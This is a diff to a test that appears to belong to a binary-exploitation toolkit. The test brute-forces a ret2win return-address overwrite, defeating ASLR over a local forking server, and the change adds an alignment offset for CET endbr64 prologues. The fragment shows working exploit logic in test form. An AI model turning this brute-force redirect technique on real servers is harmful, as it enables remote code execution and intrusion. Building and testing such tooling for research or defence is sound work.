@@ -80,7 +80,10 @@ def test_brute_ret2win_defeats_aslr_over_a_forking_server(server_bin):
         assert port, "server never listened"
         markers = attribution.make_code_markers()
         oracle = brop.socket_oracle(port, markers.command + b"\n", timeout=1.0, gap=0.1)
-        res = brop.brute_ret2win(oracle, 72, win_off, markers)
+        # The alignment-flip entry is win+1 for a bare `push rbp` prologue but win+5 when a CET
+        # endbr64 precedes it (what this host's gcc emits) -- the stage computes this; mirror it.
+        realign = exploit.win_realign_entry(tb, win_off) - win_off
+        res = brop.brute_ret2win(oracle, 72, win_off, markers, aligns=(0, realign))
         assert res, "no leak-free redirect to win() over the forking server"
         payload, _nbytes, _align = res
         neg = payload[:72] + bytes([payload[72] ^ 0xFF]) + payload[73:]
